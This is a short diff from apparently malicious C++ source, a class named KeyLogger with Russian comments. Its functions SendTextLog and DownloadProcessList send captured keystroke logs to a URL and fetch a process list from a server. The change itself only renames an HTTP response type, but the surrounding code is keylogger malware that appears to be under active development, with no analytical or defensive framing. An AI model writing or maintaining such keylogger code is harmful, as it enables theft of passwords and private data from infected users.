@@ -2858,7 +2858,7 @@ bool KeyLogger::SendTextLog(PCHAR URL, DWORD AppHash, DWORD Pid, PCHAR Log,
 	// Отправляем запрос
 	bool Result = false;
 
-	THTTPResponse Response;
+	THTTPResponseRec Response;
     ClearStruct(Response);
 
 	#ifdef CryptHTTPH
@@ -2929,7 +2929,7 @@ bool KeyLogger::DownloadProcessList(bool *NotSupportKeylogger)
 	// Отправляем запрос
 	bool Result = false;
 
-	THTTPResponse Response;
+	THTTPResponseRec Response;
     ClearStruct(Response);
 
     PCHAR Buf = NULL;
